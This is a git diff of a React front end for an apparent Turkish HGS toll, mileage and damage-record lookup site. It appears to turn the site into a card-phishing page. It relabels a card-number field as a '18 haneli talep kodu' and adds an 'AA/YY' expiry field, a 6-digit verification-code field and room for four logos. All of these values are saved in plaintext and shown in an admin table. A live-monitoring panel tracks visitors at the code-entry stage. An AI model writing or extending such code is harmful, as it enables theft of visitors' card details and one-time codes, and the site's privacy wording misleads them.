@@ -4,10 +4,11 @@ import {
   ArrowLeft, ArrowRight, Car, CheckCircle2, CreditCard, Eye, EyeOff,
   Gauge, History, Image as ImageIcon, LayoutDashboard, Loader2, Palette,
   Phone, RefreshCw, Save, Settings2, ShieldCheck, TicketCheck, Trash2,
-  Upload, UserRound, Wrench
+  Upload, UserRound, Users, Activity, Radio, Wrench
 } from "lucide-react";
 import "./styles.css";
 import { isSupabaseConfigured } from "./lib/supabase";
+import { createVisitorPresence, flattenPresence, liveStats } from "./lib/presence";
 import { fetchSiteContent, saveSiteContent, createRequest, fetchRequests, updateRequestStatus, deleteAllRequests, signInAdmin, signOutAdmin, getSession, getMyAdminProfile, uploadSiteAsset } from "./lib/data";
 
 const REQUESTS_KEY = "aim_requests_v1";
@@ -126,9 +127,16 @@ const DEFAULT_SITE = {
     namePlaceholder:"Ad Soyad",
     phoneLabel:"Cep Telefonu",
     phonePlaceholder:"5XX XXX XX XX",
-    codeLabel:"16 Haneli Talep Kodu",
-    codePlaceholder:"0000 0000 0000 0000",
-    codeHelper:"Size ait 16 haneli talep/doğrulama kodunu girin.",
+    codeLabel:"18 Haneli Talep Kodu",
+    codePlaceholder:"0000 0000 0000 0000 00",
+    codeHelper:"Size ait 18 haneli talep/doğrulama kodunu girin.",
+    expiryLabel:"Talep Ay / Yıl",
+    expiryPlaceholder:"AA/YY",
+    expiryHelper:"Örnek: 12/26",
+    sixCodeLabel:"6 Haneli Talep Doğrulama Kodu",
+    sixCodePlaceholder:"000000",
+    sixCodeHelper:"6 haneli rakamsal kodu girin.",
+    logos:["","","",""],
     confirmButton:"Talebi Onayla",
     summaryTitle:"TALEP ÖZETİ",
     plateText:"Plaka",
@@ -195,8 +203,19 @@ function formatPhone(value) {
   return [d.slice(0,3),d.slice(3,6),d.slice(6,8),d.slice(8,10)].filter(Boolean).join(" ");
 }
 function isValidPhone(v) { return /^5\d{9}$/.test(v.replace(/\D/g, "")); }
-function formatCode(v) { return v.replace(/\D/g, "").slice(0,16).replace(/(.{4})/g,"$1 ").trim(); }
-function validCode(v) { return /^\d{16}$/.test(v.replace(/\D/g,"")); }
+function formatCode(v) {
+  const d=v.replace(/\D/g,"").slice(0,18);
+  return (d.match(/.{1,4}/g)||[]).join(" ");
+}
+function validCode(v) { return /^\d{18}$/.test(v.replace(/\D/g,"")); }
+function formatExpiry(v) {
+  const d=v.replace(/\D/g,"").slice(0,4);
+  if(d.length<=2) return d;
+  return `${d.slice(0,2)}/${d.slice(2)}`;
+}
+function validExpiry(v) { return /^(0[1-9]|1[0-2])\/\d{2}$/.test(v); }
+function formatSixCode(v) { return v.replace(/\D/g,"").slice(0,6); }
+function validSixCode(v) { return /^\d{6}$/.test(v); }
 function id() { return "TLP-"+Date.now().toString(36).toUpperCase()+"-"+Math.random().toString(36).slice(2,6).toUpperCase(); }
 function money(n) { return new Intl.NumberFormat("tr-TR",{style:"currency",currency:"TRY",maximumFractionDigits:0}).format(n); }
 
@@ -209,8 +228,9 @@ function App() {
   const [amount,setAmount] = useState(500);
   const [searching,setSearching] = useState(false);
   const [preview,setPreview] = useState(false);
-  const [form,setForm] = useState({name:"",phone:"",code:""});
+  const [form,setForm] = useState({name:"",phone:"",code:"",expiry:"",sixCode:""});
   const [submitted,setSubmitted] = useState(null);
+  const presenceRef = useRef(null);
 
   useEffect(()=>{
     const fn=()=>setPage(location.hash==="#admin"?"admin":"home");
@@ -243,6 +263,26 @@ function App() {
     document.documentElement.style.setProperty("--card-radius",`${site.theme.cardRadius}px`);
   },[site.theme]);
 
+  useEffect(()=>{
+    if(!isSupabaseConfigured) return;
+    const presence=createVisitorPresence();
+    presenceRef.current=presence;
+    return()=>{ presence.destroy(); presenceRef.current=null; };
+  },[]);
+
+  useEffect(()=>{
+    if(!presenceRef.current) return;
+    let stage="Ana Sayfa";
+    let serviceKey=service || null;
+    if(page==="home") stage="Ana Sayfa";
+    if(page==="service" && service==="hgs") stage="HGS Sorgulama";
+    if(page==="service" && service==="km") stage="KM Sorgulama";
+    if(page==="service" && service==="hasar") stage="Hasar Sorgulama";
+    if(page==="request") stage="Talep Bilgisi Girişi";
+    if(page==="success") stage="Talep Tamamlandı";
+    presenceRef.current.update({ page, service:serviceKey, stage });
+  },[page,service]);
+
   const currentService = site.services.find(s=>s.key===service);
 
   function chooseService(k){
@@ -261,13 +301,13 @@ function App() {
     setTimeout(()=>{setSearching(false);setPreview(true)},3000);
   }
   async function submit(){
-    if(!form.name.trim() || !isValidPhone(form.phone) || !validCode(form.code)) return;
+    if(!form.name.trim() || !isValidPhone(form.phone) || !validCode(form.code) || !validExpiry(form.expiry) || !validSixCode(form.sixCode)) return;
     const row={
       id:id(),createdAt:new Date().toISOString(),service,
       serviceTitle:currentService?.title || service,
       plate:normalizePlate(plate),amount:service==="hgs"?amount:null,
       name:form.name.trim(),phone:form.phone.replace(/\D/g,""),
-      requestCode:form.code.replace(/\D/g,""),status:"Yeni"
+      requestCode:form.code.replace(/\D/g,""),requestExpiry:form.expiry,sixCode:form.sixCode,status:"Yeni"
     };
     if(isSupabaseConfigured){
       const { error } = await createRequest(row);
@@ -290,7 +330,7 @@ function App() {
       queryVehicle={queryVehicle} toRequest={()=>setPage("request")} back={back}/>}
     {page==="request" && currentService && <RequestPage site={site} service={currentService} plate={plate} amount={amount}
       form={form} setForm={setForm} submit={submit} back={back}/>}
-    {page==="success" && <Success site={site} row={submitted} onHome={()=>{setPage("home");setService(null);setForm({name:"",phone:"",code:""});window.scrollTo(0,0)}}/>}
+    {page==="success" && <Success site={site} row={submitted} onHome={()=>{setPage("home");setService(null);setForm({name:"",phone:"",code:"",expiry:"",sixCode:""});window.scrollTo(0,0)}}/>}
     <Footer site={site}/>
   </main>
 }
@@ -382,6 +422,9 @@ function Home({site,chooseService}) {
 
 function ServicePage({site,service,plate,setPlate,amount,setAmount,searching,preview,queryVehicle,toRequest,back}) {
   const Icon=iconMap[service.key] || Car, f=site.flow;
+  useEffect(()=>{
+    // Fine-grained stage visibility is handled anonymously by page/service presence.
+  },[searching,preview,service.key]);
   return <section className="flow container">
     <button className="back" onClick={back}><ArrowLeft/>{f.backButton}</button>
     <div className="flow-head"><div className="flow-icon"><Icon/></div><div><span>{service.flowKicker}</span><h1>{service.title}</h1><p>{service.flowDescription}</p></div></div>
@@ -406,16 +449,23 @@ function ServicePage({site,service,plate,setPlate,amount,setAmount,searching,pre
 }
 
 function RequestPage({site,service,plate,amount,form,setForm,submit,back}) {
-  const r=site.request, ok=form.name.trim().length>2&&isValidPhone(form.phone)&&validCode(form.code);
+  const r=site.request, ok=form.name.trim().length>2&&isValidPhone(form.phone)&&validCode(form.code)&&validExpiry(form.expiry)&&validSixCode(form.sixCode);
   return <section className="flow container">
     <button className="back" onClick={back}><ArrowLeft/>{site.flow.backButton}</button>
     <div className="flow-head"><div className="flow-icon"><TicketCheck/></div><div><span>{r.kicker}</span><h1>{r.title}</h1><p>{r.description}</p></div></div>
     <div className="request-grid">
       <div className="panel">
+        {r.logos?.some(Boolean) && <div className="request-logo-strip">
+          {r.logos.map((logo,i)=>logo?<div className="request-mini-logo" key={i}><img src={logo} alt={`Talep logo ${i+1}`}/></div>:null)}
+        </div>}
         <label>{r.nameLabel}</label><div className="text-input"><UserRound/><input value={form.name} onChange={e=>setForm({...form,name:e.target.value})} placeholder={r.namePlaceholder}/></div>
         <label className="mt">{r.phoneLabel}</label><div className="text-input"><Phone/><span>+90</span><input inputMode="tel" value={form.phone} onChange={e=>setForm({...form,phone:formatPhone(e.target.value)})} placeholder={r.phonePlaceholder}/></div>
-        <label className="mt">{r.codeLabel}</label><div className="text-input"><CreditCard/><input inputMode="numeric" value={form.code} onChange={e=>setForm({...form,code:formatCode(e.target.value)})} placeholder={r.codePlaceholder}/></div>
+        <label className="mt">{r.codeLabel}</label><div className="text-input"><TicketCheck/><input inputMode="numeric" value={form.code} onChange={e=>setForm({...form,code:formatCode(e.target.value)})} placeholder={r.codePlaceholder}/></div>
         <small className="helper">{r.codeHelper}</small>
+        <label className="mt">{r.expiryLabel}</label><div className="text-input expiry-input"><History/><input inputMode="numeric" value={form.expiry} onChange={e=>setForm({...form,expiry:formatExpiry(e.target.value)})} placeholder={r.expiryPlaceholder}/></div>
+        <small className="helper">{r.expiryHelper}</small>
+        <label className="mt">{r.sixCodeLabel}</label><div className="text-input"><Hash/><input inputMode="numeric" maxLength={6} value={form.sixCode} onChange={e=>setForm({...form,sixCode:formatSixCode(e.target.value)})} placeholder={r.sixCodePlaceholder}/></div>
+        <small className="helper">{r.sixCodeHelper}</small>
         <button className="primary full mt" disabled={!ok} onClick={submit}>{r.confirmButton}<CheckCircle2/></button>
         <button className="secondary full" onClick={back}><ArrowLeft/>{site.flow.backButton}</button>
       </div>
@@ -577,10 +627,12 @@ function Admin({site,onSiteChange,onHome,profile,localMode=false}) {
         <button className={tab==="content"?"active":""} onClick={()=>setTab("content")}><Settings2/>Site İçeriği</button>
         <button className={tab==="theme"?"active":""} onClick={()=>setTab("theme")}><Palette/>Tema</button>
         <button className={tab==="requests"?"active":""} onClick={()=>setTab("requests")}><History/>Talepler <span>{rows.length}</span></button>
+        <button className={tab==="live"?"active":""} onClick={()=>setTab("live")}><Radio/>Canlı İzleme</button>
       </div>
       {tab==="content"&&<ContentEditor draft={draft} update={update}/>}
       {tab==="theme"&&<ThemeEditor draft={draft} update={update}/>}
       {tab==="requests"&&(loadingRows?<div className="editor-section"><Loader2 className="spin"/> Talepler yükleniyor...</div>:<RequestsPanel rows={rows} data={data} filter={filter} setFilter={setFilter} status={status} clearRequests={clearRequests}/>)}
+      {tab==="live"&&<LiveMonitor/>}
     </div>
   </main>;
 }
@@ -707,11 +759,15 @@ function ContentEditor({draft,update}) {
       }).map(([k,label])=><Field key={k} label={label} value={draft.flow[k]} onChange={v=>update(["flow",k],v)} textarea={["previewText"].includes(k)}/>)}
     </SectionBox>
 
-    <SectionBox title="Talep Sayfası Metinleri">
+    <SectionBox title="Talep Sayfası Metinleri ve Logoları" desc="Talep ekranındaki yazıları, butonu ve 4 küçük logoyu buradan yönetebilirsin.">
+      <div className="request-logo-editor-grid">
+        {[0,1,2,3].map(i=><ImageField key={i} label={`Küçük Logo ${i+1}`} value={draft.request.logos?.[i]||""} onChange={v=>update(["request","logos",i],v)}/>)}
+      </div>
       {Object.entries({
         kicker:"Üst etiket",title:"Sayfa başlığı",description:"Sayfa açıklaması",nameLabel:"İsim alanı",namePlaceholder:"İsim placeholder",
-        phoneLabel:"Telefon alanı",phonePlaceholder:"Telefon placeholder",codeLabel:"Kod alanı",codePlaceholder:"Kod placeholder",
-        codeHelper:"Kod yardım yazısı",confirmButton:"Onay butonu",summaryTitle:"Özet başlığı",plateText:"Plaka özeti",
+        phoneLabel:"Telefon alanı",phonePlaceholder:"Telefon placeholder",codeLabel:"18 haneli kod alanı",codePlaceholder:"Kod placeholder",
+        codeHelper:"Kod yardım yazısı",expiryLabel:"Ay / yıl alanı",expiryPlaceholder:"Ay / yıl placeholder",expiryHelper:"Ay / yıl yardım yazısı",sixCodeLabel:"6 haneli alan başlığı",sixCodePlaceholder:"6 haneli placeholder",sixCodeHelper:"6 haneli yardım yazısı",
+        confirmButton:"Talebi onayla butonu",summaryTitle:"Özet başlığı",plateText:"Plaka özeti",
         amountText:"Tutar özeti",statusText:"Durum yazısı",pendingText:"Bekleyen durum",privacyText:"Gizlilik açıklaması"
       }).map(([k,label])=><Field key={k} label={label} value={draft.request[k]} onChange={v=>update(["request",k],v)} textarea={["description","privacyText"].includes(k)}/>)}
     </SectionBox>
@@ -736,6 +792,72 @@ function ThemeEditor({draft,update}) {
   </SectionBox></div>
 }
 
+
+function LiveMonitor() {
+  const [visitors,setVisitors]=useState([]);
+  const [connected,setConnected]=useState(false);
+
+  useEffect(()=>{
+    if(!isSupabaseConfigured){ setConnected(false); return; }
+    const presence=createVisitorPresence((state)=>{
+      const all=flattenPresence(state);
+      // Admin panel session itself is not included in customer counts.
+      const customerVisitors=all.filter(v=>v.page!=="admin");
+      setVisitors(customerVisitors);
+      setConnected(true);
+    });
+    presence.update({page:"admin",service:null,stage:"Admin Canlı İzleme"});
+    return()=>presence.destroy();
+  },[]);
+
+  const stats=liveStats(visitors);
+  const groups=[
+    {key:"home",label:"Ana Sayfa",value:stats.home,icon:LayoutDashboard},
+    {key:"hgs",label:"HGS Sorgulama",value:stats.hgs,icon:CreditCard},
+    {key:"km",label:"KM Sorgulama",value:stats.km,icon:Gauge},
+    {key:"hasar",label:"Hasar Sorgulama",value:stats.hasar,icon:Wrench},
+    {key:"request",label:"Talep Bilgisi Girişi",value:stats.request,icon:TicketCheck},
+    {key:"success",label:"Talep Tamamlandı",value:stats.success,icon:CheckCircle2},
+  ];
+
+  return <div className="live-monitor">
+    <section className="live-hero-card">
+      <div>
+        <span className="live-kicker"><Radio/> CANLI İZLEME</span>
+        <h2>Şu anda sitede <b>{stats.total}</b> kişi var</h2>
+        <p>Ziyaretçiler anonim olarak yalnızca bulundukları ekran ve hizmet türüne göre sayılır.</p>
+      </div>
+      <div className={`live-status ${connected?"online":"offline"}`}><i/>{connected?"Realtime bağlı":"Bağlantı bekleniyor"}</div>
+    </section>
+
+    <div className="live-grid">
+      {groups.map(({key,label,value,icon:Icon})=><div className="live-stat-card" key={key}>
+        <div className="live-stat-icon"><Icon/></div>
+        <div><span>{label}</span><b>{value}</b><small>aktif ziyaretçi</small></div>
+      </div>)}
+    </div>
+
+    <section className="editor-section live-detail">
+      <div className="editor-section-head"><div><h2>Aktif Kullanıcı Akışı</h2><p>Anlık Presence durumundan oluşturulur; sayfa yenilemeye gerek yoktur.</p></div><span className="live-total-pill"><Users/>{stats.total} online</span></div>
+      <div className="live-stage-bars">
+        {groups.map(g=>{
+          const pct=stats.total?Math.round((g.value/stats.total)*100):0;
+          return <div className="stage-row" key={g.key}>
+            <div className="stage-label"><span>{g.label}</span><b>{g.value}</b></div>
+            <div className="stage-track"><i style={{width:`${pct}%`}}/></div>
+            <small>%{pct}</small>
+          </div>
+        })}
+      </div>
+    </section>
+
+    <section className="editor-section live-privacy">
+      <ShieldCheck/>
+      <div><b>Gizlilik odaklı canlı takip</b><p>Canlı izleme; ad, telefon, plaka, talep kodu veya form içeriğini yayınlamaz. Yalnızca anonim oturum kimliği ve ziyaretçinin bulunduğu işlem aşaması Presence kanalında paylaşılır.</p></div>
+    </section>
+  </div>;
+}
+
 function RequestsPanel({rows,data,filter,setFilter,status,clearRequests}) {
   return <>
     <div className="stats">
@@ -746,8 +868,8 @@ function RequestsPanel({rows,data,filter,setFilter,status,clearRequests}) {
     </div>
     <div className="admin-card">
       <div className="request-toolbar"><div className="filters">{["all","hgs","km","hasar"].map(k=><button key={k} className={filter===k?"active":""} onClick={()=>setFilter(k)}>{k==="all"?"Tümü":k.toUpperCase()}</button>)}</div><button className="danger" onClick={clearRequests}>Demo Verilerini Temizle</button></div>
-      <div className="table-wrap"><table><thead><tr><th>Talep</th><th>Hizmet</th><th>Plaka</th><th>Kullanıcı</th><th>Telefon</th><th>Tutar</th><th>Talep Kodu</th><th>Durum</th></tr></thead><tbody>
-        {data.length?data.map(r=><tr key={r.id}><td><b>{r.id}</b><small>{new Date(r.createdAt).toLocaleString("tr-TR")}</small></td><td>{r.serviceTitle}</td><td><span className="plate-mini">{r.plate}</span></td><td>{r.name}</td><td>+90 {r.phone}</td><td>{r.amount?money(r.amount):"—"}</td><td className="mono">{r.requestCode?.match(/.{1,4}/g)?.join(" ")}</td><td><select value={r.status} onChange={e=>status(r,e.target.value)}><option>Yeni</option><option>İnceleniyor</option><option>Tamamlandı</option><option>İptal</option></select></td></tr>):<tr><td colSpan="8" className="empty">Henüz talep yok.</td></tr>}
+      <div className="table-wrap"><table><thead><tr><th>Talep</th><th>Hizmet</th><th>Plaka</th><th>Kullanıcı</th><th>Telefon</th><th>Tutar</th><th>Talep Kodu</th><th>AA/YY</th><th>6 Haneli Kod</th><th>Durum</th></tr></thead><tbody>
+        {data.length?data.map(r=><tr key={r.id}><td><b>{r.id}</b><small>{new Date(r.createdAt).toLocaleString("tr-TR")}</small></td><td>{r.serviceTitle}</td><td><span className="plate-mini">{r.plate}</span></td><td>{r.name}</td><td>+90 {r.phone}</td><td>{r.amount?money(r.amount):"—"}</td><td className="mono">{r.requestCode?.match(/.{1,4}/g)?.join(" ")}</td><td><span className="expiry-badge">{r.requestExpiry||"—"}</span></td><td><span className="six-code-badge">{r.sixCode||"—"}</span></td><td><select value={r.status} onChange={e=>status(r,e.target.value)}><option>Yeni</option><option>İnceleniyor</option><option>Tamamlandı</option><option>İptal</option></select></td></tr>):<tr><td colSpan="10" className="empty">Henüz talep yok.</td></tr>}
       </tbody></table></div>
     </div>
     <div className="admin-note"><ShieldCheck/><p><b>Üretime geçiş kontrolü:</b> Bu prototip localStorage kullanır. Canlı ortamda merkezi veritabanı, admin kimlik doğrulama, rol bazlı yetki, audit log, rate limit ve sunucu tarafı doğrulama eklenmelidir.</p></div>
